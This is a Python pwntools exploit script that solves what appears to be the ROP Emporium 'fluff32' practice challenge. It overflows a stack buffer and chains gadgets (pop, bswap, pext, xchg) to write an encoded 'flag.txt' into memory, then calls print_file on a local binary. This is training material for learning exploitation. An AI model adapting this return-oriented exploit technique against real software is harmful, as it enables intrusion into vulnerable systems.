from pwn import *
import struct

data = 0x0804a018 # rw-
print_file = 0x080483d0 # plt
pop_ebx = 0x08048399 # pop ebx ; ret
pop_ecx = 0x08048558 # pop ecx ; bswap ecx ; ret
xchg = 0x08048555 # xchg byte ptr [ecx], dl ; ret
pext = 0x0804854a # pext edx, ebx, eax ; mov eax, 0xdeadbeef ; ret
mov_eax = 0x0804854f # mov eax, 0xdeadbeef ; ret
filename = b"flag.txt"

# Encoding the filename so that it can pass the mask applied by pext with al == 0xbeef
enc_filename = []
for i in filename:
    bits = bin(i)[2:]
    bits = bits.rjust(8, "0")
    bits = bits[0:4] + "0" + bits[4:]
    enc_filename.append(int(bits, 2))

# Overflow + init eax
payload = b"".join([
    b"A"*(32+12),
    p32(mov_eax),
])

# Writing filename
for i in range(len(enc_filename)):
    payload += b"".join([
        p32(pop_ebx),
        p32(enc_filename[i]),
        p32(pext),
        p32(pop_ecx),
        p32(data+i)[::-1], # because of bswap
        p32(xchg),
    ])

# Calling print_file
payload += b"".join([
    p32(print_file),
    b"B"*4,
    p32(data),
])

p = process("./fluff32")
#input("Waiting for debug")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
